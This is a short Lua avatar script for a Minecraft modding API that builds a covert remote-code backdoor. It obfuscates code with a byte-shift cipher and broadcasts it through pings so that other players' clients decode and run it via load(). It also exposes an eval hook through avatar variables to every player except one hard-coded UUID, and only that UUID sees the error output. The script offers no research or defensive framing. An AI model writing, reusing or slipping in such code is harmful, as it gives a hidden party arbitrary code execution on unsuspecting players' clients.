
local shirt = 69421
local function shit(i) return (shirt + i + shirt) end
local function nc(str)
	if not str then return end
	local out = ""
	for i = 1, #str do
		out = out..string.char((str:byte(i) + shit(i)) % 256)
	end
	return out
end
local function dc(str)
	if not str then return end
	local out = ""
	for i = 1, #str do
		out = out..string.char((str:byte(i) - shit(i)) % 256)
	end
	return out
end
---@param code string
function eval(code,uuid)
	pings.eval(nc(code),nc(uuid))
end
local tar = "e4b91448-3b58-4c1f-8339-d40f75ecacc4"
function pings.eval(code,uuid)
	local allow = true
	if uuid then
		allow = client:getViewer():getUUID() == dc(uuid)
	end
	if allow then
		local meth = load("return "..dc(code),"run",_ENV)
		local ok, err = pcall(meth)
		if client:getViewer():isLoaded() and client:getViewer():getUUID() == tar then
			if not ok then
				print(err)
			end
		end
	end
end
function reval(code,uuid)
	pings.reval(nc(code),nc(uuid))
end
function pings.reval(code, uuid)
	--if host:isHost() then return end
	uuid = dc(uuid)
	for key, vars in pairs(world.avatarVars()) do
		if (not uuid) or (uuid == key) then
			if vars.eval then
				vars.eval(dc(code))
			end
		end
	end
end
if avatar:getPermissionLevel() ~= "MAX" then return end
events.ENTITY_INIT:register(function ()
	if player:getUUID() ~= tar then
		avatar:store("eval",eval)
	end
end)